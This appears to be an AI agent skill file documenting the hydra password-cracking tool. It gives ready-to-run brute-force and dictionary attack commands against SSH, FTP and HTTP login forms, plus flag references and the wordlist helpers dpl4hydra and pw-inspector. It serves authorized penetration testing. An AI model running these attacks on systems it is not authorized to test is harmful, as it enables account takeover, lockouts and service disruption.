---
name: hydra
description: A very fast, parallelized network logon cracker that supports numerous protocols including SSH, FTP, HTTP, SMB, and RDP. Use when performing brute-force or dictionary attacks against authentication services, testing for weak credentials, or automating login attempts during penetration testing and vulnerability assessments.
---

# hydra

## Overview
Hydra is a parallelized login cracker which supports numerous protocols to attack. It is highly flexible and allows for rapid testing of credential sets against network services. Category: Password Attacks / Web Application Testing.

## Installation (if not already installed)
Assume hydra is already installed. If not:
```bash
sudo apt install hydra
```

## Common Workflows

### Single User, Password List (SSH)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

### User List, Single Password (FTP)
```bash
hydra -L users.txt -p 'Password123' ftp://192.168.1.10
```

### Multiple Targets with Threading
```bash
hydra -L users.txt -P pass.txt -M targets.txt -t 4 ssh
```

### HTTP POST Form Attack
```bash
hydra -l admin -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
```

## Complete Command Reference

### hydra
```
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
```

| Flag | Description |
|------|-------------|
| `-R` | Restore a previous aborted/crashed session |
| `-I` | Ignore an existing restore file (don't wait 10 seconds) |
| `-S` | Perform an SSL connect |
| `-s PORT` | Define a non-default port for the service |
| `-l LOGIN` | Login with a specific LOGIN name |
| `-L FILE` | Load several logins from FILE |
| `-p PASS` | Try a specific password PASS |
| `-P FILE` | Load several passwords from FILE |
| `-x MIN:MAX:CHARSET` | Password brute-force generation (type `-x -h` for help) |
| `-y` | Disable use of symbols in brute-force |
| `-r` | Use a non-random shuffling method for option `-x` |
| `-e nsr` | Try "n" null password, "s" login as pass, and/or "r" reversed login |
| `-u` | Loop around users, not passwords (implied with -x) |
| `-C FILE` | Colon separated "login:pass" format file |
| `-M FILE` | List of servers to attack, one entry per line (':' for port) |
| `-D XofY` | Divide wordlist into Y segments and use the Xth segment |
| `-o FILE` | Write found login/password pairs to FILE |
| `-b FORMAT` | Specify format for `-o`: text (default), json, jsonv1 |
| `-f` | Exit when a login/pass pair is found (per host for -M) |
| `-F` | Exit when a login/pass pair is found (global for -M) |
| `-t TASKS` | Number of parallel connects per target (default: 16) |
| `-T TASKS` | Number of parallel connects overall (for -M, default: 64) |
| `-w TIME` | Wait time for a response (default: 32s) |
| `-W TIME` | Wait time between connects per thread (default: 0) |
| `-c TIME` | Wait time per login attempt over all threads (enforces `-t 1`) |
| `-4 / -6` | Use IPv4 (default) or IPv6 addresses |
| `-v / -V` | Verbose mode / Show login+pass for each attempt |
| `-d` | Debug mode |
| `-O` | Use old SSL v2 and v3 |
| `-K` | Do not redo failed attempts (useful for mass scanning) |
| `-q` | Do not print messages about connection errors |
| `-U` | Show service module usage details |
| `-m OPT` | Options specific for a module (see `-U` output) |
| `-h` | Complete help message |

**Supported Services:**
adam6500, asterisk, cisco, cisco-enable, cobaltstrike, cvs, firebird, ftp[s], http[s]-{head|get|post}, http[s]-{get|post}-form, http-proxy, http-proxy-urlenum, icq, imap[s], irc, ldap2[s], ldap3[-{cram|digest}md5][s], memcached, mongodb, mssql, mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3[s], postgres, radmin2, rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smb2, smtp[s], smtp-enum, snmp, socks5, ssh, sshkey, svn, teamspeak, telnet[s], vmauthd, vnc, xmpp.

---

### dpl4hydra
Generates a default password list for Hydra.

```
dpl4hydra [help] | [refresh] | [BRAND] | [all]
```

| Option | Description |
|--------|-------------|
| `help` | Show help message |
| `refresh` | Download/refresh the full default password list from open-sez.me |
| `BRAND` | Generate a `username:password` list for a specific brand (e.g., linksys) |
| `all` | Dump all system credentials into `dpl4hydra_all.lst` |

---

### pw-inspector
Trims dictionary files based on password requirements.

```
pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p -s
```

| Flag | Description |
|------|-------------|
| `-i FILE` | Input file (default: stdin) |
| `-o FILE` | Output file (default: stdout) |
| `-m MINLEN` | Minimum password length |
| `-M MAXLEN` | Maximum password length |
| `-c MINSETS` | Minimum number of character sets required |
| `-l` | Include lowercase characters (a-z) |
| `-u` | Include uppercase characters (A-Z) |
| `-n` | Include numbers (0-9) |
| `-p` | Include printable characters (symbols, etc.) |
| `-s` | Include special characters |

---

### hydra-wizard
An interactive script to guide users through configuring a Hydra attack. Run by simply typing `hydra-wizard` in the terminal.

## Notes
- **Proxies**: Use environment variables `HYDRA_PROXY` (e.g., `socks5://127.0.0.1:9150`) or `HYDRA_PROXY_HTTP`.
- **Performance**: Adjust `-t` (tasks per host) carefully; high values may trigger account lockouts or DoS the service.
- **Form Attacks**: The `http-post-form` module requires a specific syntax: `"/path:form_parameters:failure_string"`. Use `-U` with the module name for exact syntax.